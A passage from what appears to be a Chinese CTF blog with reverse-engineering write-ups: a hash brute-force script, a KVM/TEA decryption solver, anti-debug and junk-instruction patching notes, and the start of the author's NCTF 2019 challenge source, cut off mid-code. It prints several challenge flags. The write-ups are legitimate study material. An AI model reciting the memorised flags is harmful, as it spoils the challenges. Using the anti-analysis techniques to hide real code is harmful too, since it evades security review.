class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]<br>]<br><br>text = <span class="hljs-string">&#x27;&#x27;</span><br>for i in range(<span class="hljs-number">21</span>):<br>    for j in range(<span class="hljs-number">17</span>):<br>        text += str(data[i][j])<br>text = list(text)<br><br>for i in range(len(text)):<br>    if text[i] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>        temp = list(text)<br>        temp[i] = <span class="hljs-string">&#x27;8&#x27;</span><br>        for j in range(i + <span class="hljs-number">1</span>, len(text)):<br>            if text[j] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                temp[j] = <span class="hljs-string">&#x27;8&#x27;</span><br>                for k in range(j + <span class="hljs-number">1</span>, len(text)):<br>                    if text[k] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                        temp[k] = <span class="hljs-string">&#x27;8&#x27;</span><br>                        temp2 = <span class="hljs-string">&#x27;&#x27;</span>.join(temp)<br>                        if hashlib.sha1(<span class="hljs-string">&#x27;clearlove9&#x27;</span> + temp2).hexdigest() == <span class="hljs-string">&#x27;3f649f708aafa7a0a94138dc3022f6ea611e8d01&#x27;</span>:<br>                            print <span class="hljs-string">&#x27;clearlove9&#x27;</span> + temp2<br>                            print <span class="hljs-string">&quot;success&quot;</span><br>                        temp[k] = <span class="hljs-string">&#x27;1&#x27;</span><br>                temp[j] = <span class="hljs-string">&#x27;1&#x27;</span><br>        temp[i] = <span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure><p> python写代码能力还是不怎么厉害啊<br> 当时好像是因为加密的时候是个list才导致爆破不出<br> 应该改成str的</p><h1 id="中科大校赛"><a href="#中科大校赛" class="headerlink" title="中科大校赛"></a>中科大校赛</h1><p>难</p><h2 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h2><p>又看到了kvm<br>看来这个坑必须填了<br>我佛了<br>参考链接<br><a href="https://www.cnblogs.com/Bozh/p/5753379.html">https://www.cnblogs.com/Bozh/p/5753379.html</a></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xl">第一步，获取到kvm句柄<br>kvmfd = open(<span class="hljs-string">&quot;/dev/kvm&quot;</span>, O_RDWR);<br>第二步，创建虚拟机，获取到虚拟机句柄。<br>vmfd = ioctl(kvmfd, KVM_CREATE_VM, <span class="hljs-number">0</span>);<br>第三步，为虚拟机映射内存，还有其他的PCI，信号处理的初始化。<br>ioctl(kvmfd, KVM_SET_USER_MEMORY_REGION, &amp;mem);<br>第四步，将虚拟机镜像映射到内存，相当于物理机的boot过程，把镜像映射到内存。<br>第五步，创建vCPU，并为vCPU分配内存空间。<br>ioctl(kvmfd, KVM_CREATE_VCPU, vcpuid);<br><span class="hljs-function"><span class="hljs-title">vcpu</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">kvm_run_mmap_size</span> = ioctl(kvm-&gt;</span>dev_fd, KVM_GET_VCPU_MMAP_SIZE, <span class="hljs-number">0</span>);<br>第五步，创建vCPU个数的线程并运行虚拟机。<br><span class="hljs-function"><span class="hljs-title">ioctl</span>(kvm-&gt;</span><span class="hljs-function"><span class="hljs-title">vcpus</span>-&gt;</span>vcpu_fd, KVM_RUN, <span class="hljs-number">0</span>);<br>第六步，线程进入循环，并捕获虚拟机退出原因，做相应的处理。<br>这里的退出并不一定是虚拟机关机，虚拟机如果遇到IO操作，访问硬件设备，缺页中断等都会退出执行，退出执行可以理解为将CPU执行上下文返回到QEMU。<br></code></pre></td></tr></table></figure><p>创建kvm句柄-&gt;创建vm-&gt;分配内存-&gt;加载镜像到内存-&gt;启动线程执行KVM_RUN.<br>所以一般都是看拷贝的机器码来分析<br>hlt代表退出<br>这题可以看出是个tea<br>//我傻了没有运行。。。发现就是写好解密函数<br>调用号自己改就行</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall sub_55C5F338615B(unsigned<span class="hljs-built_in"> int </span>*a1,<span class="hljs-built_in"> int </span>a2, __int64 a3)<br>&#123;<br>  unsigned<span class="hljs-built_in"> int </span>*v3; // rax<br>  unsigned<span class="hljs-built_in"> int </span>*v4; // rax<br>  __int64 result; // rax<br>  unsigned<span class="hljs-built_in"> int </span>*v6; // rax<br> <span class="hljs-built_in"> int </span>v7; // [rsp+Ch] [rbp-2Ch]<br> <span class="hljs-built_in"> int </span>v8; // [rsp+20h] [rbp-18h]<br>  unsigned<span class="hljs-built_in"> int </span>v9; // [rsp+20h] [rbp-18h]<br> <span class="hljs-built_in"> int </span>v10; // [rsp+24h] [rbp-14h]<br> <span class="hljs-built_in"> int </span>v11; // [rsp+24h] [rbp-14h]<br>  unsigned<span class="hljs-built_in"> int </span>j; // [rsp+28h] [rbp-10h]<br> <span class="hljs-built_in"> int </span>i; // [rsp+28h] [rbp-10h]<br>  unsigned<span class="hljs-built_in"> int </span>v14; // [rsp+2Ch] [rbp-Ch]<br>  unsigned<span class="hljs-built_in"> int </span>v15; // [rsp+2Ch] [rbp-Ch]<br>  unsigned<span class="hljs-built_in"> int </span>v16; // [rsp+30h] [rbp-8h]<br>  unsigned<span class="hljs-built_in"> int </span>v17; // [rsp+30h] [rbp-8h]<br>  unsigned<span class="hljs-built_in"> int </span>v18; // [rsp+30h] [rbp-8h]<br>  unsigned<span class="hljs-built_in"> int </span>v19; // [rsp+34h] [rbp-4h]<br>  unsigned<span class="hljs-built_in"> int </span>v20; // [rsp+34h] [rbp-4h]<br><br> <span class="hljs-built_in"> if </span>( a2 )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( a2 &lt;= 1 )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( a2 &lt; -1 )<br>      &#123;<br>        v7 = -a2;<br>        v11 = 52 / -a2 + 6;<br>        v15 = -1640531527 * v11;<br>        v20 = *a1;<br>        do<br>        &#123;<br>          v9 = (v15 &gt;&gt; 2) &amp; 3;<br>          for ( i = v7 - 1; i; --i )<br>          &#123;<br>            v17 = a1[i - 1];<br>            v6 = &amp;a1[i];<br>            *v6 -= ((v20 ^ v15) + (v17 ^ *(_DWORD *)(4LL * (v9 ^ i &amp; 3) + a3))) ^ (((4 * v20) ^ (v17 &gt;&gt; 5))<br>                                                                                 + ((v20 &gt;&gt; 3) ^ (16 * v17)));<br>            v20 = *v6;<br>          &#125;<br>          v18 = a1[v7 - 1];<br>          *a1 -= (((4 * v20) ^ (v18 &gt;&gt; 5)) + ((v20 &gt;&gt; 3) ^ (16 * v18))) ^ ((v20 ^ v15)<br>                                                                         + (v18 ^ *(_DWORD *)(4<span class="hljs-class">LL * v9 + a3)));</span><br>          result = *a1;<br>          v20 = *a1;<br>          v15 += 1640531527;<br>          --v11;<br>        &#125;<br>        while ( v11 );<br>      &#125;<br>    &#125;<br>    else<br>    &#123;<br>      v10 = 52 / a2 + 6;<br>      v14 = 0;<br>      v16 = a1[a2 - 1];<br>      do<br>      &#123;<br>        v14 -= 1640531527;<br>        v8 = (v14 &gt;&gt; 2) &amp; 3;<br>        for ( j = 0; j &lt; a2 - 1; ++j )<br>        &#123;<br>          v19 = a1[j + 1];<br>          v3 = &amp;a1[j];<br>          *v3 += ((v19 ^ v14) + (v16 ^ *(_DWORD *)(4LL * (v8 ^ j &amp; 3) + a3))) ^ (((4 * v19) ^ (v16 &gt;&gt; 5))<br>                                                                               + ((v19 &gt;&gt; 3) ^ (16 * v16)));<br>          v16 = *v3;<br>        &#125;<br>        v4 = &amp;a1[a2 - 1];<br>        *v4 += ((*a1 ^ v14) + (v16 ^ *(_DWORD *)(4LL * (v8 ^ j &amp; 3) + a3))) ^ (((4 * *a1) ^ (v16 &gt;&gt; 5))<br>                                                                             + ((*a1 &gt;&gt; 3) ^ (16 * v16)));<br>        result = *v4;<br>        v16 = result;<br>        --v10;<br>      &#125;<br>      while ( v10 );<br>    &#125;<br>  &#125;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br>int main()<br>&#123;<br>    unsigned char key[] = &#123;0xEF, 0xBE, 0xAD, 0xDE, 0x21, 0x43, 0xEE, 0x12, 0x66, 0xC6,<br>  0x12, 0xBE, 0xBC, 0x3A, 0x12, 0x86&#125;;<br>  unsigned char flag[] = &#123;0xA9, 0x0B, 0xFC, 0x5D, 0xAA, 0xD9, 0xB6, 0xEC, 0x27, 0x8C,<br>  0x32, 0xB9, 0x0B, 0xF0, 0xAF, 0x6E, 0xF9, 0x44, 0x32, 0xE2,<br>  0x33, 0xB8, 0x1B, 0x6C, 0xA1, 0xD5, 0x9C, 0x8C, 0x0B, 0x60,<br>  0x57, 0x44, 0xEA, 0x65, 0xF5, 0xB1, 0x69, 0x0F, 0x8F, 0x9C,<br>  0x26, 0x64, 0x04, 0x10, 0x67, 0xD6, 0xB9, 0xA4, 0x3F, 0xB1,<br>  0x7A, 0x40, 0x16, 0x86, 0xC0, 0xB7&#125;;<br>  unsigned char temp[56];<br><br> <span class="hljs-built_in"> int </span>i,j,k;<br>  for(i=0;i&lt;56;i++)<br>  &#123;<br>      for(k=0;k&lt;56;k++)<br>        temp[k]=flag[k];<br>      sub_55C5F338615B(temp,-i,key);<br>      for(j=0;j&lt;56;j++)<br>      &#123;<br>          printf(<span class="hljs-string">&quot;%c&quot;</span>,temp[j]);<br>      &#125;<br>      printf(<span class="hljs-string">&quot;\n&quot;</span>);<br>  &#125;<br> <span class="hljs-built_in"> return </span>0;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接爆破<br>flag{KVM_i3_4_b4sic_linux_c0mp0n3nt_k3rn3l_supp0rt_vm}<br>过几天再写写xnuca的<br>当时没写出来</p><h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><p>有一说一，感觉这比赛质量不太行<br>俩到re<br>一道二血<br>还有一道和roar的tank一模一样的套路<br>我都佛了<br>说一下第一道吧</p><h2 id="flodbg"><a href="#flodbg" class="headerlink" title="flodbg"></a>flodbg</h2><p>就是个花指令加反调试题<br>完全不存在加密算法。。。说实话也太简单了吧<br><img src="30.png" alt="30"><br>time什么的反调试直接patch即可<br><img src="31.png" alt="31"><br><img src="32.png" alt="32"><br>花指令主要是像上面的俩种<br>很好去<br>然后调试就能猜出func3是个类似栅栏的函数<br>他不改变你输入的值只是单纯移了下位<br>那就简单了输入0123456789abcdefgh然后把对应位还原即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0123456789abcdefghi</span><br><span class="hljs-attribute">8f6c90e1dg237abh5i4</span><br><span class="hljs-attribute">S</span>@yRtfTl<span class="hljs-number">0</span>+ag-L_<span class="hljs-number">3</span>M&#125;&#123;<br><span class="hljs-attribute">flag</span>&#123;My-StL_R<span class="hljs-number">0</span>T@+<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="NCTF-2019出题记录"><a href="#NCTF-2019出题记录" class="headerlink" title="NCTF 2019出题记录"></a>NCTF 2019出题记录</h1><h2 id="难看的代码"><a href="#难看的代码" class="headerlink" title="难看的代码"></a>难看的代码</h2><p>源码奉上</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a,<span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hua</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">smc</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span>* v, <span class="hljs-keyword">uint32_t</span>* k)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">desmc</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span>* v, <span class="hljs-keyword">uint32_t</span>* k)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fuck</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a)</span></span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> check[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">193</span>,<span class="hljs-number">38</span>,<span class="hljs-number">158</span>,<span class="hljs-number">255</span>,<span class="hljs-number">110</span>&#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> fc[<span class="hljs-number">24</span>] = &#123;<span class="hljs-number">161</span>,<span class="hljs-number">209</span>,<span class="hljs-number">117</span>,<span class="hljs-number">242</span>,<span class="hljs-number">66</span>,<span class="hljs-number">208</span>,<span class="hljs-number">136</span>,<span class="hljs-number">126</span>,<span class="hljs-number">6</span>,<span class="hljs-number">143</span>,<span class="hljs-number">245</span>,<span class="hljs-number">155</span>,<span class="hljs-number">133</span>,<span class="hljs-number">235</span>,<span class="hljs-number">152</span>,<span class="hljs-number">76</span>,<span class="hljs-number">164</span>,<span class="hljs-number">49</span>,<span class="hljs-number">114</span>,<span class="hljs-number">212</span>,<span class="hljs-number">212</span>,<span class="hljs-number">101</span>,<span class="hljs-number">23</span>,<span class="hljs-number">234</span>&#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> key[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x12345678</span>,<span class="hljs-number">0xbadf00d</span>,<span class="hljs-number">0x5201314</span>,<span class="hljs-number">0x87654321</span>&#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> exit_0[] = &#123;<span class="hljs-number">0xC7</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x0C</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>&#125;;<span class="hljs-comment">//exit_code</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> flag[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;plz input the flag:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span 